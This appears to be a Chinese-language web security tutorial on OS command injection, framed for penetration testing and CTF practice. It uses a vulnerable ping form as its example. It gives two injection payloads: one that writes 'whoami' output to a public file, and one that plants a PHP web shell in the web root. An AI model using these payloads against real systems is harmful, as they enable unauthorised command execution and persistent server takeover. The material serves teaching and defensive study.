# Web 应用利用 - 操作系统命令注入

某些 Web 应用程序可能会使用直接与底层操作系统交互的函数来完成任务。这可能非常危险，并可能允许攻击者执行任意操作系统命令。这类所谓的操作系统命令注入通常被攻击者用来获取对目标系统的初步立足点甚至完全控制权，其本质极具破坏性。操作系统命令注入可能发生在不同应用程序的不同位置。一个例子是搜索功能，它会产生一个 shell 并运行一个脚本来查询公司的旧记录。另一个更明显的例子是网络监控应用程序，它允许你从底层操作系统发出 Ping 命令。更简单地说，一个 Web 应用程序可能允许你在其服务器上创建文件夹，并通过该功能暴露漏洞。

## 利用操作系统命令注入

让我们使用上面描述的第二个例子：一个允许用户通过网络发送 ICMP（ping）请求的应用程序。用于指定 ping 命令目标 IPv4 地址的输入字段在服务器端未经过正确验证。攻击者可以通过在 IP 地址后附加操作系统命令并将结果存储到可公开访问的文件中来利用此漏洞：

```bash
8.8.8.8 & whoami > /var/www/html/public/whoami.txt
```

在下面的截图中，我们可以看到一次非常简单的操作系统命令注入攻击，其中查询的输出直接回显给用户。这种情况下，不需要将命令输出保存到文件中，因为我们可以在屏幕上直接看到结果。

![ping 命令注入示例](/Content/img/lessons/ping_120201117154841.png)

这个特定示例将允许攻击者识别应用程序运行在哪个用户下。在实际的 Web 应用渗透测试中，这可能足以作为概念验证，但在 CTF 环境中，这通常只是第一步。

之前的命令已经表明可以创建可访问的文件，那么为什么不创建一个简单的接口来远程访问和控制 Web 服务器（也称为 web shell）呢？

```bash
8.8.8.8 & echo "<?php echo shell_exec($_GET['cmd']); ?>" > /var/www/html/public/webshell.php
```

如果你想要更多信息，请查看 [PortSwigger 学院](https://portswigger.net/web-security/os-command-injection) 或 [OWASP 测试指南](https://owasp.org/www-community/attacks/Command_Injection)。
